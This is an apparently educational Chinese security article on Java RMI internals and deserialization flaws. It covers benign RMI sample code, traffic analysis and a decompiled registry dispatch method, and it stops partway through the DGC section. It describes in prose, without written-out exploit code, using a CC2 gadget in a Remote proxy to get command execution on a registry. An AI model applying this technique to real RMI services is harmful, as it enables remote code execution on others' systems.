0x01 前言
=======

本文主要内容： 1、讲清楚 java jrmp、rmi、jndi 之间的关联和联系。 2、从原理层面分析java rmi的使用，从而分析为什么会存在反序列化漏洞 3、对java rmi中的常见反序列化漏洞场景根据原理分类，并分析漏洞详情 4、分析JDK版本对反序列化漏洞的影响 5、分析并总结反序列化漏洞的常见修复方案

一、JRMP
------

JRMP是 Java Remote Message Protocol 的缩写，java远程通信协议。主要就是为进程间、主机间java进程之间通信制定的协议，其是基于TCP的流量协议。

二、RMI
-----

RMI是 Remote Method Invocation的缩写，java中远程方法调用，主要是为了让java中的方法和对象能被远程调用，跨JVM调用，其是基于JRMP协议的。类比于RPC远程过程调用，c语言里面C 程序员一直使用远程过程调用 (RPC) 在远程主机上执行 C 函数并返回结果。这里JRMP是结合java特性（面向对象）设置的"RPC"。

三、JNDI
------

Java Naming and Directory Interface，Java的命名和目录的接口。其为java实现的应用程序提供命名、目录服务;java中常见的命名和目录服务有：

轻型目录访问协议 (LDAP)  
通用对象请求代理架构 (CORBA) 通用对象服务 (COS) 名称服务  
Java 远程方法调用 (RMI) 注册表  
域名服务 (DNS)

也就是说JNDI的命名和目录服务

0x02 RMI
========

笔者对RMI的了解是在大学的时候java课程里面讲到的远程调用的时候，其核心就是远程调用其他主机上或者jvm上的类的相关方法，而远程调用过程中传输的数据内容是以序列化的形式传输的，必要的时候可能还会传输对象的引用等（当然也是以序列化的方式传输），传输的格式是基于JRMP协议的。

如下是rmi的一个样例,RMI中由三部分构成，Registry、Server 、Client

**server：**

定义一个接口类，这个接口类要继承Remote接口，其中定义一个接口方法（此方法就是之后要远程调用的方法）并且该接口方法要爬出RemoteException异常，然后在其实现类中重写接口方法的实现，并且实现类要继承UnicastRemoteObject类（这个类的相关方法作用于导出对象(存根/Stub)的处理以及JRMP的处理,当然这里其实也不是说一定要继承这个类，也可以通过其他方法手动导出，但是后文中都是以继承UnicastRemoteObject类这种方法）

接口类Hello：

```php
package  newrmi;  
​  
import java.rmi.Remote;  
import java.rmi.RemoteException;  
​  
public interface Hello extends Remote {  
//定义的之后需要被远程调用的方法  
    public String welcome(String name) throws RemoteException;  
}
```

实现类Helloimp：

```php
package newrmi;  
​  
import java.rmi.RemoteException;  
import java.rmi.server.UnicastRemoteObject;  
​  
public class Helloimp extends UnicastRemoteObject implements Hello {  
​  
    public Helloimp() throws RemoteException {  
    }  
    //重写远程方法实现  
    @Override  
    public String welcome(String name) throws RemoteException {  
        return "hello"+name;  
    }  
}  
​
```

准备好之后还需要把这个远程对象绑定到Registry中，所以这里我们接下来先看下Registry实现

**Registry:**

使用LocateRegistry.createRegistry方法开启一个注册中心，然后server将刚刚准备的远程对象绑定到注册中心：

```php
package newrmi;  
​  
​  
import newrmi.Hello;  
import newrmi.Helloimp;  
​  
import java.rmi.AlreadyBoundException;  
import java.rmi.RemoteException;  
import java.rmi.registry.LocateRegistry;  
import java.rmi.registry.Registry;  
​  
public class RmiRegistryAndServer {  
    public static void main(String\[\] args) {  
        try {  
            //开启远程注册中心  
            Registry registry \= LocateRegistry.createRegistry(9999);  
            // （server）绑定对象到注册中心，并给他取名为hello  
            Hello hello \= new Helloimp();  
            registry.bind("hellos",hello);  
            System.out.println("open port for rmi for 9999:hellos");  
        } catch (RemoteException | AlreadyBoundException e) {  
            e.printStackTrace();  
        }  
    }  
}  
​
```

**Client:**

客户端 去注册中心获取相关对象：

```php
package newrmi;  
​  
import java.rmi.NotBoundException;  
import java.rmi.RemoteException;  
import java.rmi.registry.LocateRegistry;  
import java.rmi.registry.Registry;  
​  
public class Client {  
    public static void main(String\[\] args) {  
        try {  
​  
            Registry registry \= LocateRegistry.getRegistry("localhost", 9999);  
            Hello hello \= (Hello) registry.lookup("hellos");  
            System.out.println(hello.welcome("axin"));  
        } catch (RemoteException e) {  
            e.printStackTrace();  
        } catch (NotBoundException e) {  
            e.printStackTrace();  
        }  
​  
    }  
}  
​
```

这里我测试的时候使用的是本机，所以这里客户端找Registry，直接在localhost找对应端口获取到对应的注册中心即可，然后通过lookup传入参数，来调用对应绑定对应名称的对象：

运行client：如下，可以看到相关方法被调用了：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-3ed820c5b7a4a161da8c5ca51ecf46b9d318abf2.png)

以上是rmi过程中我们见到最多的常见，客户端向Registry lookup一个名称，最终实现对某个远程方法的调用。

接下来我们详细的学习下rmi的全过程：

一、RMI全过程
--------

一般来说rmi调用分为以下几步：

1、创建注册中心（createRegistry）

2、server端绑定相关对象到注册中心（bind/rebind）

3、客户端向注册中心查询（lookup）

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-389dd19cf20acb11b09f07fb2cc7b2fc799ea90d.png)

### 第一个过程

创建Registry没啥好说的，直接通过`LocalRegistry.CreateRegistry("端口")`创建一个注册中心。

### 第二个过程

Server向注册中心绑定相关类对象，调用方法bind/rebind

开启一个Registry，然后Server调用bind方法绑定对象：

如下是server代码：

```php
import newrmi.Hello;  
import newrmi.Helloimp;  
​  
import java.rmi.AlreadyBoundException;  
import java.rmi.RemoteException;  
import java.rmi.registry.LocateRegistry;  
import java.rmi.registry.Registry;  
​  
public class Server {  
    public static void main(String\[\] args) {  
        try {  
            //获取远程注册中心  
            Registry registry = LocateRegistry.getRegistry(9999);  
            // （server）绑定对象到注册中心，并给他取名为helloxxx  
            Hello hello = new Helloimp();  
            registry.bind("helloxxx",hello);  
            System.out.println("open port for rmi for 9999:helloxxx");  
        } catch (RemoteException e) {  
            e.printStackTrace();  
        }  
    }  
}  
​
```

运行server：

如下三图是笔者抓取server执行bind之后的流量记录：

server起了一个进程，使用2231端口和Registry使用的9999端口建立连接

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-3f34fc460af804643c88a1934870ddd2de281a2b.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-6d910b025c9702a192754d5b4ac6e62a2d8a17c9.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-3556b97e1d1bceb3fcb416a7768c37e1a2a30b3e.png)

分析上述三图，这里我们可以直观的看到 客户端和注册中心进行了jrmp握手之类的，然后就发送了一个序列化对象给注册中心。 这个序列化对象其实是远程类的一个stub（而发送给注册中心的这一过程就是由被bind的类上文提到的其继承的父类UnicastRemoteObject的方法中来实现），笔者在后文称其为存根（其实就是一个代理了远程类的对象的代理类）。 注意发送的不是远程类本身的对象。这里我们关注下存根里面的如下处：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-5bd7f649a540892ac2dd1191b4fa3d738de849ac.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-eab5678417deb91974b0fa48343bf6c98ad83ffd.png)

上图中，在存根里面有一个IP（10.43.42.220是我本地无线网卡地址），IP之后跟的端口是，有一个`08b6`,转化成十进制之后是`2230`,其实这个就是server 最终将对应远程类置放的地址，这个地址存放到对象我们称其为骨根，也叫skeleton。这个骨根之后有大用处。

后续我们还能看到一个流量是：2232端口去连接我们上面算出来的server真正绑定远程对象的地址（2230端口）：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-39e1146ca72a1a1fded28e4f3500e8aa65684308.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-86e8a19fcefe3d22d3ba118725e111377598fa59.png)

仔细分析其中内容，我们可以发现，这里是又使用jrmp协议，Registry向Server中的骨根对象地址发起了一次dgc dirty请求，返回了一个Lease对象。

这里我们需要了解下dgc是干啥的，为啥Server的bind的流量中，Server将存根序列化对象传送到Registry之后，Registry还需要反过来dgc请求Server绑定的骨根。

**dgc：**

全称distributed garbage-collection，是java中支撑远程方法调用设计的一套垃圾回收协议，Dgc里面就两个方法，一个叫clean 一个叫dirty；

如下是jdk中对其的描述：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-f6be541064652b6743775355be7ca1252a7102d6.png)

简单来说就是，当DGC中的客户端不需要存根的时候，就要调用clean方法，以便DGC的服务端可以回收相关垃圾。当DGC中的客户端持有某个存根或者需要持续的使用存根的时候，就要调用dirty方法，从而让DGC的服务端知道，客户端在使用，不能回收。除此之外使用dirty方法之后，会收到一个lease响应，这个lease里面会有一些时间的期限类的东西，超过期限还没有收到下一次的dirty请求，这个对象就会被回收。

更简单的说就是租房，dirty是续约操作，返回的lease是房东告诉你你付的钱够租到什么时候，如果到时间我还没收到续约，那就直接把你轰出去住大街，clean是说不续约了。

除此之外，这还有一个**要点**：

传输内容的格式，传输对象的内容都是以序列化的形式出现在流量中：如下两图：

Server发送给Registry stub存根对象的时候，发送的是序列化后的存根对象：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-aa8d545fa3f5cbe327eedabfde0d38883a94b715.png)

如下是dgc的请求，发送的也是序列化对象

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-49e7d4bf821c491bbc1ed0b01f3a051ce8231536.png)

**bind过程的总结图：**

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-ad43350f352dc3a8332fee4ca1fd50dbb753eda1.png)

### 第三个过程：

客户端的lookup：

客户端向Registry发送lookup请求的时候，Registry会检索传入的名称来匹配stub存根对象，从而将stub对象返回到客户端。

客户端接收到存根之后，存根里面记录了骨根的位置，客户端就会请求骨根从而实现远程方法调用：

客户端代码：

```php
import java.rmi.NotBoundException;  
import java.rmi.RemoteException;  
import java.rmi.registry.LocateRegistry;  
import java.rmi.registry.Registry;  
​  
public class Client {  
    public static void main(String\[\] args) {  
        try {  
​  
            Registry registry = LocateRegistry.getRegistry("localhost", 9999);  
            Hello hello = (Hello) registry.lookup("helloxxx");  
            System.out.println(hello.welcome(" axin"));  
        } catch (RemoteException e) {  
            e.printStackTrace();  
        } catch (NotBoundException e) {  
            e.printStackTrace();  
        }  
​  
    }  
}  
​
```

抓取流量：

如下图是，客户端从Registry（9999端口）获取到存根：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-54c089315d8bd9b745dc4835de03503562d4a452.png)

存根中的含有骨根的地址：本地的2230端口：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-3fd27cbc357b5941f2dfafa2513b50feb47f1008.png)

接着，客户端就会直接去server对应的骨根发起请求，如下图：

存在四个动作：

- 客户端先发送一个DGC的dirty请求，表示我现在在用这个对象，请别回收。
- 服务端返回一个lease对象，表示xxx时间之前给你用。
- 客户端发送了一个字符串序列化对象，里面存放的是调用远程方法使用的参数。
- 最后服务端返回一个序列化对象，里面存放的是远程方法调用结果。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-1c48a49785ba8bb88a2f88bb7cd19054dcabf4a6.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-3bf9318fa87c9df257a848d88d02bab8c42ad3b9.png)

**lookup过程的总结图：**

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-dc8ef1ec2de7696f7b1169c0b074a80079d8484a.png)

rmi的全部过程基本就是上述了，上述的过程中其实有很多薄弱的点，接下来我们来看，rmi中的被发现的安全问题。

二、RMI中的反序列化安全问题：
----------------

上文提到rmi中所有传输的对象都是以序列化的形式进行传输的，那么接收端就有一个反序列化还原的对象的操作，这个过程中如果没有做好防护和限制，对恶意的序列化对象进行反序列化，可能就会导致任意命令执行、代码执行的漏洞。

### 1、分析反序列化漏洞的场景：

#### （1、Server端bind 相关远程对象到Registry

情况1：

Server端发送一个序列化的stub存根到Registry，Registry会对该对象进行反序列化，如果这个对象是构造好存在调用链的，这个过程就变成了Server端对Registry进行攻击；如下图：(正常情况下发送的就是一个继承了UnicastRemoteObject类和继承了Remote接口的类的一个代理过去【也就是存根】）)

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-24bddb63be985407ac01c5c18327f29b845cbb27.png)

情况2：Server端发送一个序列化的stub存根到Registry，Registry收到该对象之后要返回一个序列化对象获取，Server会对该对象进行反序列化，如果这个对象是构造好存在调用链的，这个过程就变成了Registry端对Server进行攻击；如下图:

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-30c3db22eb45422516145f6fe7fe4f01579d1a93.png)

情况3：

bind操作的流量里面，Registry收到stub之后，需要对其解析获取其中骨根的地址，向骨根发送一个DGC请求dirty，这个传输的也是一个序列化对象（这个对象正常是一个），如果这个对象是构造好的存在调用链的，Server端接收到该对象之后会对其进行反序列化。这个过程就变成了Registry对Server端进行的攻击。如下图：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-0401d30b4798a3e61c523bc754a697b97a816c1f.png)

情况4：

bind操作的流量里面，Registry收到stub之后，需要对其解析获取其中骨根的地址，向骨根（serve端）发送一个DGC请求dirty，serve端收到之后要返回一个lease对象（这个对象里面有相关时间记录，用来维护回收对象），这个对象的传输形式也是序列化，如果这个对象是构造好的存在调用链的，Registry端接收到该对象之后会对其进行反序列化。这个过程就变成了Server对Registry进行的攻击。如下图：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-cc445e71b50ccc4db34ecb26efa923485ee54dbb.png)

#### （2、客户端Lookup 向Registry绑定的远程对象

情况5：客户端通过lookup发送一个名称对象的序列化内容请求过去，Registry会对客户端的序列化内容进行反序列化，如果这个对象被替换成了构造好的存在调用链的恶意类对象，那么这个场景就变成了客户端对 Registry的攻击；如下图：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-d9764df8bf877a54f1a463c2171e991cb5034e1b.png)

情况6：客户端通过lookup发送一个名称请求过去，Registry需要根据绑定的名称，返回对应远程对象的存根 stub，客户端收到存根，需要对其进行反序列化，如果这个存根对象被替换成了构造好的存在调用链的恶意类对象，那么这个过程就变成了Registry对客户端的攻击

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-ccc5a2668b4efaf3dc43a2802e3a1b843a9006c5.png)

情况7：客户端收到正常的存根之后，会根据存根里面的对象属性，找到服务端的骨根，接着向server端的骨根发送一个dgc的dirty请求，serve端收到之后会对其进行反序列化，如果这个对象被替换成了构造好的存在调用链的恶意类对象，那么这个过程就变成了客户端对服务端发起的攻击。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-07020a60abc156d92e4cffda5f7c0856b236145d.png)

情况8：客户端收到正常的存根之后，会根据存根里面的对象属性，找到服务端的骨根，接着向server端的骨根发送一个dgc的dirty请求，serve端收到之后会返回一个lease对象的序列化内容给客户端，客户需要对这个对象进行反序列化，如果这个对象被替换成了构造好的存在调用链的恶意类对象，那么这个过程就变成了服务端对客户端发起的攻击。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-e9636fdccc933b9a29fae8d0678c4dbc65a2db3f.png)

### 2、除此之外：

其实还有两个情况，

情况9：就是远程调用的时候要传递参数，这个内容也都是序列化传输，可能会出现反序列化漏洞；

情况10：就是远程调用的时候要传递返回结果，这个内容也都是序列化传输，可能会出现反序列化漏洞；

### 3、总结：

简单总结上述的攻击场景：

如下图，开源看到其实情况1、2和情况3、4从攻击受害的角度来看是可以合并的。最后形成的关系其实就是6种攻击利用场景(没有把情况9和10画上去)

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-c5a0e51d133ac74108e39bfb0fe64b48242f7227.png)

其实不然，最后的攻击场景从实现原理上来看，只有6种：上面的10个场景都涵盖在了下面的六种情况里面。

1、rmi：

- 对存根对象的操作来实现攻击
- 对存根处理的响应对象的操作来实现攻击
- 对远程调用请求参数对象操作实现攻击
- 对远程调用返回参数对象操作实现攻击

2、jrmp

- 对DGC机制里面的dirty/clean操作发送的对象操作实现攻击
- 对DGC机制里面的dirty/clean操作的响应对象操作实现攻击

### 4、场景代码分析

环境准备：这里笔者开了三个idea：

分别当作Registry、Client、Server

Registry: 这里java实现一个Registry的时候，在这里需要先绑定了一个对象（Helloimp），因为笔者测试的时候发现好像Registry上面没有对象是起不来的，所以就直接给绑了个对象，不影响其他。

```php
import rmi.Hello;  
import rmi.Helloimp;  
​  
import java.rmi.AlreadyBoundException;  
import java.rmi.RemoteException;  
import java.rmi.registry.LocateRegistry;  
import java.rmi.registry.Registry;  
​  
public class RmiRegistry {  
    public static void main(String\[\] args) {  
        try {  
            //开启远程注册中心  
            Registry registry \= LocateRegistry.createRegistry(9999);  
            // （server）绑定对象到注册中心，并给他取名为hello  
            Hello hello \= new Helloimp();  
            registry.bind("hellos",hello);  
            System.out.println("open port for rmi for 9999:hellos");  
        } catch (RemoteException | AlreadyBoundException e) {  
            e.printStackTrace();  
        }  
    }  
}
```

绑定对象的类的实现：

Hello接口（必须要继承Remote，并且定义远程抽象方法的时候要抛出RemoteException异常）：

```php
package  rmi;  
​  
​  
import java.rmi.Remote;  
import java.rmi.RemoteException;  
​  
public interface Hello extends Remote {  
    public String welcome(String name) throws RemoteException;  
}

Helloimp实现类 实现定义的Hello接口并且要继承UnicastRemoteObject：

package rmi;  
​  
import java.rmi.RemoteException;  
import java.rmi.server.UnicastRemoteObject;  
​  
public class Helloimp extends UnicastRemoteObject implements Hello {  
    public Helloimp() throws RemoteException {  
​  
    }  
    @Override  
    public String welcome(String name) throws RemoteException {  
        return "hello"+name;  
    }  
}  
​
```

Server:

```php
package rmi;  
​  
import java.rmi.AlreadyBoundException;  
import java.rmi.RemoteException;  
import java.rmi.registry.LocateRegistry;  
import java.rmi.registry.Registry;  
​  
public class RmiServer {  
    public static void main(String\[\] args) {  
        try {  
            //获取远程注册中心  
            Registry registry \= LocateRegistry.getRegistry(9999);  
            // （server）绑定对象到注册中心，并给他取名为hello  
            Hello hello \= new HelloImp();  
            registry.bind("Test",hello);  
            System.out.println("open port for rmi for 9999:Test");  
        } catch (RemoteException | AlreadyBoundException e) {  
            e.printStackTrace();  
        }  
    }  
​  
}
```

Server类中需要定义绑定的类：

绑定类的接口：

```php
package  rmi;  
​  
​  
import java.rmi.Remote;  
import java.rmi.RemoteException;  
​  
public interface Hello extends Remote {  
    public String welcome(String name) throws RemoteException;  
}

实现类：和上面的Registry初始化绑定的类有细微差别，但是都是继承Hello接口

package rmi;  

import java.rmi.RemoteException;  
import java.rmi.server.UnicastRemoteObject;  

public class HelloImp extends UnicastRemoteObject implements Hello {  
    public HelloImp() throws RemoteException {  

    }  
    @Override  
    public String welcome(String name) throws RemoteException {  
        return "Hi good mooning "+name;  
    }  
}  
```

Client:

```php
import java.rmi.NotBoundException;  
import java.rmi.RemoteException;  
import java.rmi.registry.LocateRegistry;  
import java.rmi.registry.Registry;  
​  
public class Client {  
    public static void main(String\[\] args) {  
        try {  
​  
            Registry registry \= LocateRegistry.getRegistry("localhost", 9999);  
​  
            Hello hello \= (Hello) registry.lookup("Test");  
            System.out.println(hello.welcome(" axin"));  
        } catch (RemoteException e) {  
            e.printStackTrace();  
        } catch (NotBoundException e) {  
            e.printStackTrace();  
        }  
​  
    }  
}  
​
```

定义接口类：这里我们在客户端也要定义下远程类的接口，和其中的远程方法，用于接收对应类型的对象（笔者是这么理解的）

```php
package rmi;  
​  
import java.rmi.Remote;  
import java.rmi.RemoteException;  
​  
public interface Hello extends Remote {  
    public String welcome(String name) throws RemoteException;  
}
```

环境准备好了，所有环境使用的JDK都是jdk8.031:

### 1）、对存根对象操作实现的攻击利用

这里我们先来看对存根对象操作实现的攻击利用，拿Registry和Server之间的处理来分析（bind操作）：

#### Registry &amp; Server

先运行Registry代码，起一个Registry：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-dd502b792eb8a4a4d7990ad22591ea2fc01bb7a4.png)

然后在server的bind处打个断点，开始调试：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-ac0d1015cc8993da62f6b5b5429495cf6aaddebc.png)

如下，server中我们可以看到,我们获取的Registry对象其实是一个RgistryImp\_Stub对象（这里需要注意的是，RgistryImp\_Stub是动态生成的，我们的断点是没办法打进去的，所以实际情况下我们要结合前后栈的情况，以及静态分析来分析）

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-a6f5c0ffb8ac225795944c09862bcb068a0be7cd.png)

接着我们new了一个HelloImp对象，但是似乎和我们认知中的HelloImp对象是有区别的；

原因是我们继承了UncastRemoteObject这个类，在调用HelloImp的构造方法的时候触发父类构造方法，最后在UncastRemoteObject类里面的exportObject（）方法里面返回一个远程对象代理对象（其实就是我们上文理论中说的stub存根对象，同时上文也说到可以不继承这个类，那么我们就需要手动调用这个方法将stub导出）：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-ccdb071ff0e8f3889b411ad30b5056872250e303.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-04656865807fbaf4628f049ff28f678f52bacd03.png)

接着我们来看bind方法；

RegistryImpl\_Stub这个对象的bind方法如下：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-dfa300088704aee6917bf02da133c7830d921092.png)

如下，38行是再建立和Registry的连接，并传送了一个0，和一个hash值

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-34c3405e001432ef9dc432b6203530a871ca4be8.png)

接下来41行是获取建立连接的对象输出流，42、43行是将传入的两个参数序列化写到连接里面（一个是序列化的字符串 Test，一个是序列化的远程代理对象【导出的stub对象】）。

我们来看对端Registry这边是怎么处理请求的：

这里有一个小技巧，在对Registry调试的时候，我们找不到该在哪下断点。此时我们可以直接断点打到ObjectInputStream的readObject方法上即可，因为最后接收到的对象一定是要被反序列化的（殊途同归嘛）。

如下：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-f93caeff03a0c5f20dc947219654834f62dbf676.png)

然后开始调试运行Registry，再正常运行Server：

直接来到下的readObject方法的断点处：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-37cf1a9c647f87d9987273d703b6b92810e6503c.png)

此时的函数调用栈如下：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-bf9873bb1f0ca39b33f8bd268065fe97c70e918b.png)

其实整个过程的核心就是RegistryImpl\_Skel()的 dispatch方法，在反序列化操作之前也就是这个方法，但是由于这个方法是在RegistryImpl\_Skel里面的（笔者把这个对象理解成Registry的骨根）动态生成的，所以我们的断点没办法打进去调试，但是无妨，我们来静态分析下这个方法：

如下图：首先显示对var4做了核对，其实就是对Server端发送过来的hash值：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-032b6c7fd9c343ae4301e828d16c8430f829393e.png)

其他的几个参数我们看不到，这里我们可以再往栈上找：如下这个UnicastServerRef类里面，我们就可以看到了：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-c2839af1c2058183f5f9e7eb2d13e104cfdaf80a.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-c137d342b8f26674698da557f921df2ee2dfd9d6.png)

打上断点，重新调试其相关变量参数的值如下：

var1是RegistryImp的存根

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-d0a34d10df3a67b0733d767f3a2cb6ff054b53a6.png)

var2是远程连接对象：

var3是0：其实就是上面Server端newcall的时候传入的opnum：0

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-2b8a40c67dff2a4d690c79c6377f47df130ebc9c.png)

此时我们再回到RegistryImpl\_Skel()的 dispatch方法：

```php
    public void dispatch(Remote var1, RemoteCall var2, int var3, long var4) throws Exception {  
        if (var4 != 4905912898345647071L) {  
            throw new SkeletonMismatchException("interface hash mismatch");  
        } else {  
            RegistryImpl var6 \= (RegistryImpl)var1;  
            String var7;  
            Remote var8;  
            ObjectInput var10;  
            ObjectInput var11;  
            switch(var3) {  
            case 0:  
                try {  
                    var11 \= var2.getInputStream();  
                    var7 \= (String)var11.readObject();  
                    var8 \= (Remote)var11.readObject();  
                } catch (IOException var94) {  
                    throw new UnmarshalException("error unmarshalling arguments", var94);  
                } catch (ClassNotFoundException var95) {  
                    throw new UnmarshalException("error unmarshalling arguments", var95);  
                } finally {  
                    var2.releaseInputStream();  
                }  
​  
                var6.bind(var7, var8);  
​  
                try {  
                    var2.getResultStream(true);  
                    break;  
                } catch (IOException var93) {  
                    throw new MarshalException("error marshalling return", var93);  
                }  
            case 1:  
                var2.releaseInputStream();  
                String\[\] var97 \= var6.list();  
​  
                try {  
                    ObjectOutput var98 \= var2.getResultStream(true);  
                    var98.writeObject(var97);  
                    break;  
                } catch (IOException var92) {  
                    throw new MarshalException("error marshalling return", var92);  
                }  
            case 2:  
                try {  
                    var10 \= var2.getInputStream();  
                    var7 \= (String)var10.readObject();  
                } catch (IOException var89) {  
                    throw new UnmarshalException("error unmarshalling arguments", var89);  
                } catch (ClassNotFoundException var90) {  
                    throw new UnmarshalException("error unmarshalling arguments", var90);  
                } finally {  
                    var2.releaseInputStream();  
                }  
​  
                var8 \= var6.lookup(var7);  
​  
                try {  
                    ObjectOutput var9 \= var2.getResultStream(true);  
                    var9.writeObject(var8);  
                    break;  
                } catch (IOException var88) {  
                    throw new MarshalException("error marshalling return", var88);  
                }  
            case 3:  
                try {  
                    var11 \= var2.getInputStream();  
                    var7 \= (String)var11.readObject();  
                    var8 \= (Remote)var11.readObject();  
                } catch (IOException var85) {  
                    throw new UnmarshalException("error unmarshalling arguments", var85);  
                } catch (ClassNotFoundException var86) {  
                    throw new UnmarshalException("error unmarshalling arguments", var86);  
                } finally {  
                    var2.releaseInputStream();  
                }  
​  
                var6.rebind(var7, var8);  
​  
                try {  
                    var2.getResultStream(true);  
                    break;  
                } catch (IOException var84) {  
                    throw new MarshalException("error marshalling return", var84);  
                }  
            case 4:  
                try {  
                    var10 \= var2.getInputStream();  
                    var7 \= (String)var10.readObject();  
                } catch (IOException var81) {  
                    throw new UnmarshalException("error unmarshalling arguments", var81);  
                } catch (ClassNotFoundException var82) {  
                    throw new UnmarshalException("error unmarshalling arguments", var82);  
                } finally {  
                    var2.releaseInputStream();  
                }  
​  
                var6.unbind(var7);  
​  
                try {  
                    var2.getResultStream(true);  
                    break;  
                } catch (IOException var80) {  
                    throw new MarshalException("error marshalling return", var80);  
                }  
            default:  
                throw new UnmarshalException("invalid method number");  
            }  
​  
        }  
    }
```

可以下面的逻辑是，对var3进行分析判断，分别对其是0，1，2，3，4进行处理：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-71f34013965a9aaf104914f1f31a59671b724b89.png)

上图中这里我们直接看0，因为之前我们Server传入的是0；接着38行从var2（连接）中获取对象输入流；

如下图：39、40从对象输入流中反序列化获取到两个参数，一个是String一个是远程对象（Server也是序列化发送了两个序列化参数，分别是名称和导出stub对象），最后再49行，Registry本地调用RegistryImp的bind方法，将获取到的名称和对象绑定上去。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-8355434faa4d138c41d7b3e8f60ecb81f9ba0ef8.png)

最后我们简单来看下上面dispatch里面的4个case：

0其实就对应的bind；

1对应的是list操作，如下图

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-bc6d52784938166d78ab3f30f30a67c7606b9ebf.png)

2对应的是lookup操作，如下图：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-736c1b082a54cfe2cac07f79bd4b0911836aa0f8.png)

3对应的是rebind操作,如下图：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-70443e6642b22f6ac54c4b1061abe92bda0ce07a.png)

4对应的是unbind操作：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-2a24eb3be8c377ae3134afaacef557095f650333.png)

所以这里RegistryImpl\_Skel对象的dispatch方法其实就是Registry处理来自客户端和服务端的请求的函数。

从上面我们可以得到一个结论，其实不管是哪个情况（bind/unbind/lookup/list）都存在不安全的反序列化场景，也就是被传输的序列化对象在jdk8\_031版本没有做任何的安全校验直接进入反序列化。

#### 攻击构造

所以这里我们尝试构造攻击就非常简单，找到一个符合远程调用的类的，并且构造一个这个类的实例，能够在反序列化的时候触发相关调用链即可：

所以关键就两个：一个是符合远程调用条件、第二个是调用链

第二个倒好说，因为调用链直接可以使用cc链里面的即可。比如使用cc2，构造一个特殊的优先队列,PriorityQueue,其被反序列化触发调用链即可：

如下图：直接构造cc2的优先队列对象，bind，但是出现了报错，也就是被发送的对象要符合条件。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-74083d03008451332b8ab8ab53bc467019430014.png)

查看bind方法对参数的要求：如下图，可以看到这个对象是Remote的子类

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-5d2776d84eb1b29a241f934ee38f750311e7fb30.png)

那么我们怎么把这个PriorityQueue这个优先队列转化成Remote呢，这里可以使用java里面的动态代理和cc1里面的思想一样，生成一个包含优先队列的远程代理对象：

如下图：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-cf83fe9c2d6b6a7215c85866d8a7d75e9a811f68.png)

接着启动注册中心，然后运行我们的恶意的server，将构造好的对象bind过去，如下图，成功触发命令执行：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-c1cfbe6f7d7ae6c1fc33bcface0e76099b510df3.png)

### 2）、对jrmp中dgc操作实现的攻击利用

这里我们同样也拿server 和Registry之间的bind操作来分析，因为在bind操作中，Registry接收到存根对象之后，需要发送dgc请求给Server上的骨根对象来”租借“对应的存根，以避免被回收；Server端正常情况下是要返回一个lease对象给Registry。

这里我们还是从bind这个操作里面来分析下代码：

Server发送stub给Registry，Registry反序列化stub之后的代码如下：其实就是接着上面的代码分析，在RegistryImp\_skel的dispatch方法里面：

如下图case 0 就是bind操作的情况，可以看到39、40对收到的名称和stub对象反序列化之后，最终在46行的finally里面的调用了RemoteCall里面的releaseImputStream

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-0983ff12ffd8045d40cddbbe68aff8d15e1c0e67.png)

